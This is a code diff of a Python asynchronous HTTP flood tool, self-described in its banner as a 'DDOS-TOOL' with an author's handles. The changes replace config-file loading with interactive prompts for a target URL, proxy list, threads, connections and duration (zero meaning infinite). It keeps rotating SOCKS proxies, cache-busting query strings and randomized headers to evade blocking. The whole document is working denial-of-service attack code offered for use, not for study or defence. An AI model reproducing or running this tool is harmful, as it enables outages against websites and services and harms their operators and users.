@@ -10,7 +10,9 @@ License: MIT
 """
 
 import asyncio
+import os
 import random
+import socket
 import string
 import sys
 import time
@@ -18,7 +20,6 @@ from pathlib import Path
 from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
 
 import aiohttp
-import yaml
 from aiohttp_socks import ProxyConnector
 
 
@@ -55,8 +56,8 @@ def rand_token(n: int = 10) -> str:
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 
-def build_headers(target_type: str) -> dict:
-    h = {
+def build_headers() -> dict:
+    return {
         "User-Agent": random.choice(UA_POOL),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": random.choice(ACCEPT_LANGS),
@@ -68,11 +69,6 @@ def build_headers(target_type: str) -> dict:
         "X-Request-Id": rand_token(16),
         "X-Client-Trace": rand_token(8),
     }
-    if target_type == "discord":
-        h["Content-Type"] = "application/json"
-    elif target_type == "telegram":
-        h["Content-Type"] = "application/x-www-form-urlencoded"
-    return h
 
 
 class ProxyRing:
@@ -115,72 +111,83 @@ class ProxyRing:
 
 
 class Runner:
-    def __init__(self, cfg: dict, ring: ProxyRing):
-        self.cfg = cfg
+    def __init__(self, url: str, concurrency: int, duration: int, ring: ProxyRing | None):
+        self.url = url
+        self.concurrency = concurrency
+        self.duration = duration
         self.ring = ring
         self.sent = 0
         self.failed = 0
-        self.bytes_out = 0
         self._stop = False
         self._lock = asyncio.Lock()
+        self._sessions: dict[str, aiohttp.ClientSession] = {}
+        self._connectors: dict[str, ProxyConnector] = {}
         self._last_report = time.time()
         self._last_sent = 0
 
-    def _bust(self, base: str) -> str:
-        p = urlparse(base)
+    def _bust(self) -> str:
+        p = urlparse(self.url)
         q = parse_qsl(p.query)
         q.append(("_", rand_token(8)))
         return urlunparse(p._replace(query=urlencode(q)))
 
-    async def fire(self, target: dict, session_cache: dict, connector_cache: dict):
-        proxy_url = await self.ring.next()
-        if proxy_url is None:
-            self._stop = True
-            return
+    async def _client_for(self, proxy_url: str | None):
+        key = proxy_url or "__direct__"
+        sess = self._sessions.get(key)
+        if sess and not sess.closed:
+            return sess
 
-        connector = connector_cache.get(proxy_url)
-        if connector is None:
-            connector = ProxyConnector.from_url(proxy_url, rdns=True, limit=0, limit_per_host=0)
-            connector_cache[proxy_url] = connector
+        if proxy_url:
+            conn = self._connectors.get(proxy_url)
+            if conn is None:
+                conn = ProxyConnector.from_url(proxy_url, rdns=True, limit=0, limit_per_host=0)
+                self._connectors[proxy_url] = conn
+        else:
+            conn = aiohttp.TCPConnector(limit=0, limit_per_host=0)
 
-        session = session_cache.get(proxy_url)
-        if session is None or session.closed:
-            session = aiohttp.ClientSession(
-                connector=connector,
-                timeout=aiohttp.ClientTimeout(total=self.cfg["attack"]["timeout_sec"]),
-                auto_decompress=False,
-                skip_auto_headers={"Accept-Encoding"},
-            )
-            session_cache[proxy_url] = session
+        sess = aiohttp.ClientSession(
+            connector=conn,
+            timeout=aiohttp.ClientTimeout(total=6),
+            auto_decompress=False,
+            skip_auto_headers={"Accept-Encoding"},
+        )
+        self._sessions[key] = sess
+        return sess
 
-        url = self._bust(target["url"]) if self.cfg["attack"]["cache_buster"] else target["url"]
-        headers = build_headers(target.get("type", "http"))
+    async def fire(self):
+        if self.ring is not None:
+            proxy_url = await self.ring.next()
+            if proxy_url is None:
+                self._stop = True
+                return
+        else:
+            proxy_url = None
+
+        url = self._bust()
+        headers = build_headers()
+        sess = await self._client_for(proxy_url)
 
         try:
-            method = "POST" if target.get("type") == "discord" else "GET"
-            data = b"{}" if method == "POST" else None
-            async with session.request(method, url, headers=headers, data=data, allow_redirects=False) as r:
+            async with sess.get(url, headers=headers, allow_redirects=False) as r:
                 await r.read()
-            await self.ring.ok(proxy_url)
+            if proxy_url:
+                await self.ring.ok(proxy_url)
             async with self._lock:
                 self.sent += 1
-                self.bytes_out += len(url) + 400
         except Exception:
-            await self.ring.fail(proxy_url)
+            if proxy_url:
+                await self.ring.fail(proxy_url)
             async with self._lock:
                 self.failed += 1
 
-    async def worker(self, target: dict, session_cache: dict, connector_cache: dict, deadline: float):
-        jmin, jmax = self.cfg["obfuscation"]["jitter_ms"]
+    async def worker(self, deadline: float):
         while time.time() < deadline and not self._stop:
-            await self.fire(target, session_cache, connector_cache)
-            if jmax:
-                await asyncio.sleep(random.uniform(jmin, jmax) / 1000.0)
+            await self.fire()
+            await asyncio.sleep(random.uniform(0.005, 0.12))
 
     async def reporter(self, deadline: float):
-        every = self.cfg["logging"].get("report_every_sec", 5)
         while time.time() < deadline and not self._stop:
-            await asyncio.sleep(every)
+            await asyncio.sleep(5)
             now = time.time()
             async with self._lock:
                 sent = self.sent
@@ -188,61 +195,110 @@ class Runner:
             rps = (sent - self._last_sent) / max(0.001, now - self._last_report)
             self._last_report = now
             self._last_sent = sent
-            print(
-                f"[{time.strftime('%H:%M:%S')}] sent={sent} failed={failed} "
-                f"rps={rps:.0f} alive_proxies={self.ring.alive()}/{len(self.ring.ring)}"
-            )
+            alive = self.ring.alive() if self.ring else "-"
+            total = len(self.ring.ring) if self.ring else "-"
+            print(f"[{time.strftime('%H:%M:%S')}] sent={sent} failed={failed} rps={rps:.0f} proxies={alive}/{total}")
 
-    async def run(self, target: dict) -> dict:
-        conc = self.cfg["attack"]["concurrency"]
-        deadline = time.time() + self.cfg["attack"]["duration_sec"]
-        session_cache: dict = {}
-        connector_cache: dict = {}
-
-        tasks = [
-            asyncio.create_task(self.worker(target, session_cache, connector_cache, deadline))
-            for _ in range(conc)
-        ]
-        reporter = asyncio.create_task(self.reporter(deadline))
+    async def run(self) -> dict:
+        deadline = time.time() + self.duration if self.duration > 0 else float("inf")
+        tasks = [asyncio.create_task(self.worker(deadline)) for _ in range(self.concurrency)]
+        rep = asyncio.create_task(self.reporter(deadline))
 
         try:
-            await asyncio.gather(*tasks)
-        except asyncio.CancelledError:
+            if self.duration > 0:
+                await asyncio.gather(*tasks)
+            else:
+                while not self._stop:
+                    await asyncio.sleep(1)
+                for t in tasks:
+                    t.cancel()
+        except (asyncio.CancelledError, KeyboardInterrupt):
             self._stop = True
-        finally:
-            self._stop = True
-            reporter.cancel()
-            for s in session_cache.values():
-                if not s.closed:
-                    await s.close()
-            for c in connector_cache.values():
-                await c.close()
+            for t in tasks:
+                t.cancel()
 
-        return {"sent": self.sent, "failed": self.failed, "bytes_out": self.bytes_out}
+        self._stop = True
+        rep.cancel()
 
+        for s in self._sessions.values():
+            if not s.closed:
+                await s.close()
+        for c in self._connectors.values():
+            await c.close()
 
-def load_config(path: str) -> dict:
-    with open(path, "r") as f:
-        return yaml.safe_load(f)
+        return {"sent": self.sent, "failed": self.failed}
 
 
-async def async_main(cfg: dict):
-    target = cfg["targets"][0]
-    ring = ProxyRing(cfg["proxy"]["file"], cfg["proxy"]["max_failures_before_drop"])
-    n = ring.load()
-    print(f"loaded {n} proxies")
+def prompt(msg: str, default: str | None = None) -> str:
+    suffix = f" [{default}]" if default is not None else ""
+    val = input(f"{msg}{suffix}: ").strip()
+    return val if val else (default or "")
 
-    runner = Runner(cfg, ring)
-    result = await runner.run(target)
+
+def gather_inputs() -> dict:
+    target = os.environ.get("AASHU_TARGET") or prompt("Target URL/IP")
+    if not target:
+        print("no target, exiting")
+        sys.exit(1)
+
+    proxy_env = os.environ.get("AASHU_PROXIES")
+    if proxy_env is not None:
+        use_proxies = True
+        proxy_file = proxy_env
+    else:
+        answer = prompt("Do you want to use proxies? (y/n)", "n").lower()
+        use_proxies = answer.startswith("y")
+        proxy_file = prompt("Proxy file path", "proxies.txt") if use_proxies else None
+
+    threads = int(os.environ.get("AASHU_THREADS") or prompt("Threads", "80"))
+    conns = int(os.environ.get("AASHU_CONNS") or prompt("Connections per thread", "40"))
+    duration = int(os.environ.get("AASHU_DURATION") or prompt("Duration in seconds (0 = infinite)", "60"))
+
+    return {
+        "target": target,
+        "use_proxies": use_proxies,
+        "proxy_file": proxy_file,
+        "threads": threads,
+        "conns": conns,
+        "duration": duration,
+    }
+
+
+async def main_async(opts: dict):
+    ring = None
+    if opts["use_proxies"]:
+        ring = ProxyRing(opts["proxy_file"])
+        n = ring.load()
+        print(f"loaded {n} proxies")
+        if n == 0:
+            print("no proxies in file, exiting")
+            return
+
+    concurrency = opts["threads"] * opts["conns"]
+    print(f"starting: target={opts['target']} concurrency={concurrency} duration={opts['duration']}s")
+
+    runner = Runner(opts["target"], concurrency, opts["duration"], ring)
+    try:
+        result = await runner.run()
+    except KeyboardInterrupt:
+        result = {"sent": runner.sent, "failed": runner.failed}
     print(f"result: {result}")
 
 
 def main():
     if IS_WINDOWS:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-    cfg = load_config(sys.argv[1] if len(sys.argv) > 1 else "config.yaml")
-    print(f"platform={sys.platform} target={cfg['targets'][0]['name']} vector={cfg['attack']['vector']}")
-    asyncio.run(async_main(cfg))
+
+    print("DDOS-TOOL — worst")
+    print("Author / Developer / Admin / Owner: Aashu")
+    print("GitHub: @outwiles | Telegram: @outwiles | Email: outwiles@proton.me")
+    print()
+
+    opts = gather_inputs()
+    try:
+        asyncio.run(main_async(opts))
+    except KeyboardInterrupt:
+        print("\nstopped")
 
 
 if __name__ == "__main__":
